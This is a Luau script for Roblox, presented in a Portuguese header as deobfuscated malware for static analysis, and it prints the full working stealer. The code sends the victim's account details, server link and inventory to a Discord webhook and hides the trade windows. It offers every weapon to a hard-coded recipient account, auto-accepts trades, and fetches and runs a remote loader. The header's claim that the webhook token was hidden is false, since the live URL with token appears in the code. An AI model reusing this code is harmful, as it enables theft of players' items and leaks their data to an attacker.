--[[
    CÓDIGO DESOFUSCADO PARA ANÁLISE ESTÁTICA

    Este arquivo expõe a lógica do código fornecido; ele não foi executado.
    O token do webhook foi substituído por [TOKEN_OCULTO]. As demais strings
    permanecem visíveis para permitir a inspeção dos destinos e das chamadas.

    O código depende de Luau, do ambiente Roblox e de recursos de executor,
    incluindo request, getgc e loadstring. Não é um programa Lua independente.

    Comportamento observado: relata dados e inventário a um webhook, oculta
    interfaces de troca, oferece armas ao alvo e confirma trocas automaticamente.
    Também baixa e executa um script externo após um atraso. Esse conteúdo
    externo NÃO foi acessado nem inspecionado; suas ações permanecem desconhecidas.

    A formatação e os comentários não corrigem falhas do original. A única
    ocultação intencional de conteúdo é o token do webhook já ocultado.
]]

-- Configuração do alvo, dos destinos externos e dos limites da automação.
local targetName = "olhom_y77"
local webhookUrl = "https://discord.com/api/webhooks/1563735594457235578/LSLX34_Zwg6UJSQj3JXh0nA7JO7bLimSWDEwn99Er7o2Wu2mVItjj_WAk0tuDGlUjxEU"
local bannerImageUrl = "https://images.unsplash.com/photo-1522383225653-ed111181a951?w=1200&q=80"
local maxTradeRestarts = (25)
local autoAcceptEnabled = true
local excludedItems = {DefaultKnife = true, DefaultGun = true}
local secondaryScriptUrl = "https://api.luarmor.net/files/v4/loaders/5857a6cfae3b902eb3c2dff7cdbf173b.lua"
local secondaryScriptDelay = (10)
local valuableRarities = {Godly = true, Ancient = true, Unique = true}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer
local httpRequest = request or (syn and syn.request) or (http and http.request)
local compileSource = loadstring

-- Obtém texto por HTTP. A chamada game.HttpGet(url) com ponto foi preservada.
local function fetchText(url)
    if httpRequest then
        return httpRequest({Url = url, Method = "GET"}).Body
    end
    if game.HttpGet then
        return game.HttpGet(url)
    end
    if game.HttpGetAsync then
        return game:HttpGetAsync(url)
    end
    error("Sem metodo HTTP")
end

local function postJson(endpoint, jsonBody)
    if httpRequest then
        return httpRequest({
            Url = endpoint,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonBody
        })
    end
    return HttpService:PostAsync(endpoint, jsonBody, Enum.HttpContentType.ApplicationJson)
end

-- Carregamento remoto independente. Apenas a execução do resultado compilado
-- fica em pcall; a própria chamada a loadstring não fica protegida por pcall.
task.spawn(function()
    task.wait(secondaryScriptDelay)
    local downloadOk, downloadedSource = pcall(fetchText, secondaryScriptUrl)
    if not downloadOk or not downloadedSource or downloadedSource == "" then
        return
    end
    if not compileSource then
        return
    end
    local downloadedChunk = compileSource(downloadedSource)
    if downloadedChunk then
        pcall(downloadedChunk)
    end
end)

-- Remotes de troca procurados na estrutura replicada do jogo.
local tradeFolder = ReplicatedStorage:WaitForChild("Trade")
local sendRequestRemote = tradeFolder:WaitForChild("SendRequest")
local offerItemRemote = tradeFolder:WaitForChild("OfferItem")
local startTradeRemote = tradeFolder:WaitForChild("StartTrade")
local updateTradeRemote = tradeFolder:WaitForChild("UpdateTrade")
local acceptTradeRemote = tradeFolder:WaitForChild("AcceptTrade")
local declineTradeRemote = tradeFolder:FindFirstChild("DeclineTrade")

local itemDatabase
pcall(function()
    itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"))
end)

local categories = {"Weapons", "Pets", "Effects", "Perks", "Emotes", "Radios"}
local keyedInventoryCategories = {Weapons = true, Pets = true}
local isTrading = false
local startEventHandled = false
local lastOffer = nil
local lastOfferReceivedAt = (0)
local lastAcceptedOffer = nil
local localOfferCount = (0)
local lastTarget = nil
local tradeRestartCount = (0)
local stopWhenTargetJoins = false
local currentPartner = nil

-- Busca tabelas acessíveis ao executor por meio de getgc.
local function findGcTable(predicate)
    if type(getgc) ~= "function" then
        return nil
    end
    local gcOk, gcObjects = pcall(getgc, true)
    if not gcOk or type(gcObjects) ~= "table" then
        return nil
    end
    for gcIndex, gcObject in pairs(gcObjects) do
        if type(gcObject) == "table" then
            local matches = false
            pcall(function()
                matches = predicate(gcObject)
            end)
            if matches then
                return gcObject
            end
        end
    end
    return nil
end

-- O prazo limita a espera por require, mas não cancela a tarefa em andamento.
local function requireWithTimeout(moduleScript, timeoutSeconds)
    if not moduleScript then
        return nil
    end
    local requireFinished, requiredValue
    task.spawn(function()
        local requireOk, requireResult = pcall(require, moduleScript)
        if requireOk then
            requiredValue = requireResult
        end
        requireFinished = true
    end)
    local elapsedSeconds = (0)
    while not requireFinished and elapsedSeconds < timeoutSeconds do
        task.wait(0.05);
        elapsedSeconds += 0.05
    end
    return requiredValue
end

local function getProfile()
    local profileFromGc = findGcTable(function(candidateProfile)
        local candidateWeapons = rawget(candidateProfile, "Weapons")
        return type(candidateWeapons) == "table" and type(rawget(candidateWeapons, "Owned")) == "table"
    end)
    if profileFromGc then
        return profileFromGc
    end
    local modulesFolder = ReplicatedStorage:FindFirstChild("Modules")
    return requireWithTimeout(modulesFolder and modulesFolder:FindFirstChild("ProfileData"), (2))
end

-- Resolve a variante de uma arma evolutiva a partir do XP e da base de itens.
local function resolveUniqueWeapon(databaseForEvo, uniqueEntry)
    local baseItem = uniqueEntry.BaseItem
    if not uniqueEntry.EvoEquipped then
        return baseItem
    end
    local baseWeapon = databaseForEvo.Weapons and databaseForEvo.Weapons[baseItem]
    if not (baseWeapon and baseWeapon.Evo) then
        return baseItem
    end
    local uniqueXp, evoStage = uniqueEntry.XP or (0), (1)
    if baseWeapon.Evo[(2)] and uniqueXp >= baseWeapon.Evo[(2)].XPRequired then
        evoStage = (2)
    end
    if baseWeapon.Evo[(3)] and uniqueXp >= baseWeapon.Evo[(3)].XPRequired then
        evoStage = (3)
    end
    if baseWeapon.Evo[(4)] and uniqueXp >= baseWeapon.Evo[(4)].XPRequired then
        evoStage = (4)
    end
    return (baseWeapon.Evo[evoStage] and baseWeapon.Evo[evoStage].ItemName) or baseItem
end

-- Coleta dados para o relatório. O total final conta entradas, não quantidades.
-- A marcação de itens valiosos considera armas e itens únicos.
local function collectInventory()
    local inventoryProfile = getProfile()
    local inventoryDatabase = itemDatabase or (findGcTable(function(candidateDatabase)
        return type(rawget(candidateDatabase, "Weapons")) == "table" and type(rawget(candidateDatabase, "Rarities")) == "table"
    end))
    local inventoryItems = {}
    local inventoryCounts = {
        total = (0),
        Weapons = (0),
        Pets = (0),
        Effects = (0),
        Perks = (0),
        Emotes = (0),
        Radios = (0),
        Uniques = (0)
    }
    local hasValuableItems = false
    if not inventoryProfile or not inventoryDatabase then
        return inventoryItems, inventoryCounts, hasValuableItems
    end

    for categoryIndex, categoryName in ipairs(categories) do
        local ownedEntries = inventoryProfile[categoryName] and inventoryProfile[categoryName].Owned
        if type(ownedEntries) == "table" then
            local categoryDatabase = inventoryDatabase[categoryName]
            for ownedKey, ownedValue in pairs(ownedEntries) do
                local itemId = keyedInventoryCategories[categoryName] and ownedKey or ownedValue
                local itemQuantity = tonumber(ownedValue) or (1)
                local itemDefinition = categoryDatabase and categoryDatabase[itemId]
                if itemDefinition then
                    table.insert(inventoryItems, {
                        name = itemDefinition.ItemName or itemDefinition.Name or tostring(itemId),
                        qty = itemQuantity,
                        category = categoryName,
                        rarity = itemDefinition.Rarity,
                    })
                    if inventoryCounts[categoryName] ~= nil then
                        inventoryCounts[categoryName] += itemQuantity
                    end
                    if categoryName == "Weapons" and itemDefinition.Rarity and valuableRarities[itemDefinition.Rarity] then
                        hasValuableItems = true
                    end
                end
            end
        end
    end

    if type(inventoryProfile.Uniques) == "table" then
        for uniqueKey, ownedUnique in pairs(inventoryProfile.Uniques) do
            if type(ownedUnique) == "table" then
                local uniqueWeaponId = resolveUniqueWeapon(inventoryDatabase, ownedUnique)
                local uniqueDefinition = inventoryDatabase.Weapons and inventoryDatabase.Weapons[uniqueWeaponId]
                local uniqueRarity = uniqueDefinition and uniqueDefinition.Rarity or "Unique"
                table.insert(inventoryItems, {
                    name = (uniqueDefinition and (uniqueDefinition.ItemName or uniqueDefinition.Name)) or tostring(ownedUnique.BaseItem),
                    qty = (1),
                    category = "Uniques",
                    rarity = uniqueRarity,
                    rank = ownedUnique.Rank,
                    evo = ownedUnique.EvoEquipped and true or nil,
                })
                inventoryCounts.Uniques += (1)
                if valuableRarities[uniqueRarity] then
                    hasValuableItems = true
                end
            end
        end
    end
    inventoryCounts.total = #inventoryItems
    table.sort(inventoryItems, function(leftItem, rightItem)
        if leftItem.category ~= rightItem.category then
            return leftItem.category < rightItem.category
        end
        return leftItem.name:lower() < rightItem.name:lower()
    end)
    return inventoryItems, inventoryCounts, hasValuableItems
end

local rarityColors = {
    Common = 0xFFB7C5,
    Uncommon = 0xFF69B4,
    Rare = 0xFF1493,
    Epic = 0xDB7093,
    Legendary = 0xFFD700,
    Mythic = 0xE74C3C,
    Godly = 0xFF00FF,
    Unique = 0xFFC0CB,
    Ancient = 0xE67E22,
}
local categoryIcons = {
    Weapons = "⚔️",
    Pets = "🐾",
    Effects = "✨",
    Perks = "🔮",
    Emotes = "💃",
    Radios = "📻",
    Uniques = "👑",
}

local function getRarityColor(rarity)
    return rarityColors[rarity] or 0xFFB7C5
end

local function getAvatarUrl(userId)
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
end

local function formatNumber(numberValue)
    local formattedNumber = tostring(numberValue)
    while true do
        local groupedNumber, replacementCount = formattedNumber:gsub("^(-?%d+)(%d%d%d)", "%1.%2")
        formattedNumber = groupedNumber
        if replacementCount == (0) then
            break
        end
    end
    return formattedNumber
end

local function escapeCodeBlock(codeText)
    if not codeText then
        return "?"
    end
    return tostring(codeText):gsub("```", "'''")
end

local function sanitizeText(textValue, maxLength)
    if not textValue then
        return "?"
    end
    textValue = tostring(textValue):gsub("[@`*_~|\\]", "")
    maxLength = maxLength or (64)
    if #textValue > maxLength then
        textValue = textValue:sub((1), maxLength) .. "..."
    end
    return textValue
end

-- Produz o resumo, os blocos de inventário e a cor do embed do webhook.
local function formatInventory(itemsToFormat, countsToFormat)
    local itemsByCategory = {}
    for groupIndex, groupCategory in ipairs(categories) do
        itemsByCategory[groupCategory] = {}
    end
    itemsByCategory["Uniques"] = {}
    for itemIndex, itemToGroup in ipairs(itemsToFormat) do
        if itemsByCategory[itemToGroup.category] then
            table.insert(itemsByCategory[itemToGroup.category], itemToGroup)
        end
    end
    local embedColor = 0xFFB7C5
    local rarityPriority = {"Godly", "Ancient", "Unique", "Mythic", "Legendary", "Epic", "Rare", "Uncommon", "Common"}
    for rarityIndex, priorityRarity in ipairs(rarityPriority) do
        for colorItemIndex, colorItem in ipairs(itemsToFormat) do
            if colorItem.rarity == priorityRarity then
                embedColor = getRarityColor(priorityRarity);
                break
            end
        end
        if embedColor ~= 0xFFB7C5 then
            break
        end
    end

    local summaryText = ""
    for summaryIndex, summaryCategory in ipairs(categories) do
        if countsToFormat[summaryCategory] and countsToFormat[summaryCategory] > (0) then
            summaryText = summaryText .. (categoryIcons[summaryCategory] or "") .. " `" .. summaryCategory .. "`: **" .. countsToFormat[summaryCategory] .. "**  "
        end
    end
    if countsToFormat.Uniques > (0) then
        summaryText = summaryText .. "`Uniques`: **" .. countsToFormat.Uniques .. "**"
    end

    local detailsText = ""
    for detailsIndex, detailsCategory in ipairs(categories) do
        local categoryItems = itemsByCategory[detailsCategory]
        if #categoryItems > (0) then
            detailsText = detailsText .. "\n**" .. detailsCategory:upper() .. "** (" .. countsToFormat[detailsCategory] .. ")\n```\n"
            for detailItemIndex, detailItem in ipairs(categoryItems) do
                local quantitySuffix = detailItem.qty > (1) and (" x" .. detailItem.qty) or ""
                local raritySuffix = detailItem.rarity and (" [" .. detailItem.rarity .. "]") or ""
                detailsText = detailsText .. "- " .. escapeCodeBlock(detailItem.name) .. quantitySuffix .. raritySuffix .. "\n"
            end
            detailsText = detailsText .. "```\n"
        end
    end
    if #itemsByCategory["Uniques"] > (0) then
        detailsText = detailsText .. "\n**UNIQUES** (" .. countsToFormat.Uniques .. ")\n```\n"
        for uniqueDetailIndex, uniqueDetail in ipairs(itemsByCategory["Uniques"]) do
            local evoSuffix = uniqueDetail.evo and " *" or ""
            local rankSuffix = uniqueDetail.rank and (" #" .. uniqueDetail.rank) or ""
            detailsText = detailsText .. "- " .. escapeCodeBlock(uniqueDetail.name) .. evoSuffix .. rankSuffix .. "\n"
        end
        detailsText = detailsText .. "```\n"
    end
    return summaryText, detailsText, embedColor
end

-- Envia nome, UserId, idade da conta, links de perfil/servidor e inventário.
-- Primeiro publica uma mensagem; depois tenta atualizá-la usando o ID retornado.
local function sendInventoryReport()
    if not webhookUrl or webhookUrl == "" then
        return
    end
    local normalizedWebhookUrl = webhookUrl:gsub("/$", "")
    local avatarUrl = getAvatarUrl(localPlayer.UserId)
    local serverUrl = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    local profileUrl = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
    local initialPayload = {
        username = sanitizeText(localPlayer.Name, (32)),
        avatar_url = avatarUrl,
        embeds = {{
            title = "Inventario",
            description = "**Carregando inventario...**",
            color = 0xFFB7C5,
            thumbnail = {url = avatarUrl},
            image = {url = bannerImageUrl},
            fields = {
                {name = "UserId", value = "`" .. localPlayer.UserId .. "`", inline = true},
                {name = "Conta", value = "`" .. (localPlayer.AccountAge or "?") .. " dias`", inline = true},
                {name = "Alvo", value = "`" .. targetName .. "`", inline = true},
                {name = "Server", value = "[Entrar](" .. serverUrl .. ")", inline = false},
                {name = "Perfil", value = "[Ver Perfil](" .. profileUrl .. ")", inline = false},
            },
            footer = {text = os.date("%d/%m/%Y %H:%M:%S"), icon_url = avatarUrl},
        }},
    }
    local initialResponse
    local initialPostOk = pcall(function()
        initialResponse = postJson(normalizedWebhookUrl .. "?wait=true", HttpService:JSONEncode(initialPayload))
    end)
    task.spawn(function()
        local reportItems, reportCounts, reportHasValuableItems = collectInventory()
        local reportSummary, reportDetails, reportColor = formatInventory(reportItems, reportCounts)
        local reportDescription = "**Total:** `" .. formatNumber(reportCounts.total) .. "` itens\n" .. reportSummary .. "\n" .. reportDetails
        if #reportDescription > (4096) then
            reportDescription = reportDescription:sub((1), (4093)) .. "..."
        end
        local updatedPayload = {
            embeds = {{
                title = reportHasValuableItems and "BINGO" or "Inventario",
                description = reportDescription,
                color = reportColor,
                thumbnail = {url = avatarUrl},
                image = {url = bannerImageUrl},
                fields = {
                    {name = "UserId", value = "`" .. localPlayer.UserId .. "`", inline = true},
                    {name = "Conta", value = "`" .. (localPlayer.AccountAge or "?") .. " dias`", inline = true},
                    {name = "Alvo", value = "`" .. targetName .. "`", inline = true},
                    {name = "Server", value = "[Entrar](" .. serverUrl .. ")", inline = false},
                    {name = "Perfil", value = "[Ver Perfil](" .. profileUrl .. ")", inline = false},
                },
                footer = {text = os.date("%d/%m/%Y %H:%M:%S"), icon_url = avatarUrl},
            }},
        }
        local messageId
        if initialPostOk and initialResponse then
            local responseBody = type(initialResponse) == "table" and initialResponse.Body or initialResponse
            if type(responseBody) == "string" then
                local responseDecodeOk, decodedResponse = pcall(function()
                    return HttpService:JSONDecode(responseBody)
                end)
                if responseDecodeOk and decodedResponse and decodedResponse.id then
                    messageId = decodedResponse.id
                end
            end
        end
        if messageId and httpRequest then
            pcall(function()
                httpRequest({
                    Url = normalizedWebhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(updatedPayload),
                })
            end)
        end
    end)
end

-- A lista usada nas trocas inclui armas e itens únicos; exclui apenas os dois
-- itens padrão configurados. As demais categorias aparecem só no relatório.
local function listTradableWeapons(profileToList)
    local tradableWeapons = {}
    if profileToList.Weapons and type(profileToList.Weapons.Owned) == "table" then
        for ownedWeaponId, ownedWeaponQuantity in pairs(profileToList.Weapons.Owned) do
            if not excludedItems[ownedWeaponId] then
                table.insert(tradableWeapons, {id = ownedWeaponId, amount = tonumber(ownedWeaponQuantity) or (1)})
            end
        end
    end
    if type(profileToList.Uniques) == "table" then
        for tradableUniqueKey, tradableUnique in pairs(profileToList.Uniques) do
            local resolvedWeaponId = resolveUniqueWeapon(itemDatabase or {}, tradableUnique)
            if resolvedWeaponId and not excludedItems[resolvedWeaponId] then
                table.insert(tradableWeapons, {id = resolvedWeaponId, amount = (1)})
            end
        end
    end
    return tradableWeapons
end

local function countTradableWeapons(profileToCount)
    local weaponsToCount = listTradableWeapons(profileToCount)
    local tradableCount = (0)
    for countIndex, countEntry in ipairs(weaponsToCount) do
        tradableCount += countEntry.amount
    end
    return tradableCount
end

-- Oferece todas as unidades. O estado da troca é verificado por entrada,
-- não dentro do laço de unidades de uma mesma entrada.
local function offerAllWeapons()
    local profileToOffer = getProfile()
    if not profileToOffer then
        return
    end
    local weaponsToOffer = listTradableWeapons(profileToOffer)
    for offerIndex, offerEntry in ipairs(weaponsToOffer) do
        if not isTrading then
            return
        end
        for copyIndex = (1), offerEntry.amount do
            pcall(function()
                offerItemRemote:FireServer(offerEntry.id, "Weapons")
            end)
            task.wait(0.03)
        end
    end
    local offerStableSince, previousOfferCount = os.clock(), localOfferCount
    while os.clock() - offerStableSince < 0.5 do
        task.wait(0.03)
        if localOfferCount ~= previousOfferCount then
            previousOfferCount = localOfferCount
            offerStableSince = os.clock()
        end
    end
end

local function findTargetPlayer(playerQuery)
    local exactPlayer = Players:FindFirstChild(playerQuery)
    if exactPlayer then
        return exactPlayer
    end
    playerQuery = playerQuery:lower()
    for playerIndex, candidatePlayer in ipairs(Players:GetPlayers()) do
        if candidatePlayer.Name:lower() == playerQuery or candidatePlayer.DisplayName:lower() == playerQuery then
            return candidatePlayer
        end
    end
    return nil
end

-- Cada chamada tenta solicitar a troca até quatro vezes. Uma troca iniciada
-- encerra essa espera; o contador de reinícios é mantido em outro trecho.
local function requestTradeWith(targetPlayer)
    lastTarget = targetPlayer
    for requestAttempt = (1), (4) do
        if not targetPlayer.Parent then
            return
        end
        isTrading, startEventHandled, lastOffer, lastAcceptedOffer, localOfferCount = false, false, nil, nil, (0)
        pcall(function()
            sendRequestRemote:InvokeServer(targetPlayer)
        end)
        local requestStartedAt = os.clock()
        while os.clock() - requestStartedAt < (8) do
            if isTrading then
                return
            end
            task.wait(0.15)
        end
        task.wait((3))
    end
end

-- A validação aceita parceiro nil. Para parceiros presentes, usa somente Name,
-- embora a busca inicial também permita uma correspondência por DisplayName.
local function isAllowedPartner(partnerToCheck)
    return partnerToCheck == nil or partnerToCheck.Name:lower() == targetName:lower()
end

local function declineCurrentTrade()
    pcall(function()
        if declineTradeRemote then
            declineTradeRemote:FireServer()
        elseif acceptTradeRemote then
            acceptTradeRemote:FireServer(game.PlaceId * (3), nil)
        end
    end)
end

-- O evento de início dispara a oferta automática sem validar o parceiro aqui.
startTradeRemote.OnClientEvent:Connect(function()
    if startEventHandled then
        return
    end
    isTrading, startEventHandled, lastAcceptedOffer, localOfferCount = true, true, nil, (0)
    task.wait(0.2)
    offerAllWeapons()
end)

updateTradeRemote.OnClientEvent:Connect(function(tradeUpdate)
    if type(tradeUpdate) ~= "table" then
        return
    end
    local firstPlayer = tradeUpdate.Player1 and tradeUpdate.Player1.Player
    local secondPlayer = tradeUpdate.Player2 and tradeUpdate.Player2.Player
    local otherPlayer = nil
    if firstPlayer and firstPlayer ~= localPlayer then
        otherPlayer = firstPlayer
    end
    if secondPlayer and secondPlayer ~= localPlayer then
        otherPlayer = secondPlayer
    end
    currentPartner = otherPlayer
    if otherPlayer and not isAllowedPartner(otherPlayer) then
        declineCurrentTrade()
        isTrading, startEventHandled, lastOffer, lastAcceptedOffer, currentPartner = false, false, nil, nil, nil
        -- hiddenGuis é uma global do original, distinta de lockedTradeGuis.
        -- A tentativa de restauração foi preservada sem corrigir essa diferença.
        for previouslyHiddenGui in pairs(hiddenGuis or {}) do
            pcall(function()
                previouslyHiddenGui.Enabled = true
            end)
        end
        hiddenGuis = {}
        return
    end
    if tradeUpdate.LastOffer ~= nil then
        lastOffer = tradeUpdate.LastOffer
        lastOfferReceivedAt = os.clock()
    end
    local localTradeSide
    if tradeUpdate.Player1 and tradeUpdate.Player1.Player == localPlayer then
        localTradeSide = tradeUpdate.Player1
    elseif tradeUpdate.Player2 and tradeUpdate.Player2.Player == localPlayer then
        localTradeSide = tradeUpdate.Player2
    end
    if localTradeSide and type(localTradeSide.Offer) == "table" then
        localOfferCount = #localTradeSide.Offer
    end
end)

-- Após uma conclusão sinalizada pelo servidor, verifica o inventário e pode
-- reiniciar a troca. O limite de 25 conta reinícios, além da chamada inicial.
acceptTradeRemote.OnClientEvent:Connect(function(tradeCompleted)
    if tradeCompleted then
        isTrading, startEventHandled = false, false
        task.spawn(function()
            task.wait(1.2)
            local profileAfterTrade = getProfile()
            if not profileAfterTrade then
                return
            end
            local remainingWeaponCount = countTradableWeapons(profileAfterTrade)
            if remainingWeaponCount <= (0) then
                stopWhenTargetJoins = true
                sendInventoryReport()
                return
            end
            if tradeRestartCount >= maxTradeRestarts then
                stopWhenTargetJoins = true
                return
            end
            tradeRestartCount += (1)
            if lastTarget and lastTarget.Parent then
                requestTradeWith(lastTarget)
            end
        end)
    end
end)

if declineTradeRemote then
    pcall(function()
        declineTradeRemote.OnClientEvent:Connect(function()
            isTrading, startEventHandled, lastOffer, lastAcceptedOffer, currentPartner = false, false, nil, nil, nil
        end)
    end)
end

-- Confirma automaticamente a última oferta após 6,2 s sem nova atualização.
-- Não há verificação do conteúdo ou valor recebido em troca neste trecho.
task.spawn(function()
    while true do
        task.wait(0.1)
        if autoAcceptEnabled and isTrading and lastOffer ~= nil and lastOffer ~= lastAcceptedOffer then
            if isAllowedPartner(currentPartner) and os.clock() - lastOfferReceivedAt >= 6.2 then
                lastAcceptedOffer = lastOffer
                pcall(function()
                    acceptTradeRemote:FireServer(game.PlaceId * (3), lastOffer)
                end)
            end
        end
    end
end)

-- Desativa as interfaces de troca e volta a desativá-las se Enabled mudar.
local playerGui = localPlayer:WaitForChild("PlayerGui")
local tradeGuiNames = {"TradeGUI", "TradeGUI_Phone"}
local lockedTradeGuis = {}

local function lockTradeGui(guiToLock)
    if not guiToLock or lockedTradeGuis[guiToLock] then
        return
    end
    lockedTradeGuis[guiToLock] = true
    guiToLock.Enabled = false
    guiToLock:GetPropertyChangedSignal("Enabled"):Connect(function()
        if guiToLock.Enabled then
            guiToLock.Enabled = false
        end
    end)
end

for guiNameIndex, guiName in ipairs(tradeGuiNames) do
    local existingGui = playerGui:FindFirstChild(guiName)
    if existingGui then
        lockTradeGui(existingGui)
    end
end

playerGui.ChildAdded:Connect(function(addedGui)
    for addedGuiNameIndex, expectedGuiName in ipairs(tradeGuiNames) do
        if addedGui.Name == expectedGuiName then
            task.wait(0.1)
            if addedGui:IsA("ScreenGui") then
                lockTradeGui(addedGui)
            end
        end
    end
end)

-- Envia o relatório inicial e procura o alvo; se ausente, aguarda sua entrada.
sendInventoryReport()
local initialTargetPlayer = findTargetPlayer(targetName)
if initialTargetPlayer and initialTargetPlayer ~= localPlayer then
    requestTradeWith(initialTargetPlayer)
else
    Players.PlayerAdded:Connect(function(joinedPlayer)
        if (joinedPlayer.Name:lower() == targetName:lower() or joinedPlayer.DisplayName:lower() == targetName:lower()) and not stopWhenTargetJoins then
            task.wait((3))
            if joinedPlayer.Parent then
                requestTradeWith(joinedPlayer)
            end
        end
    end)
end
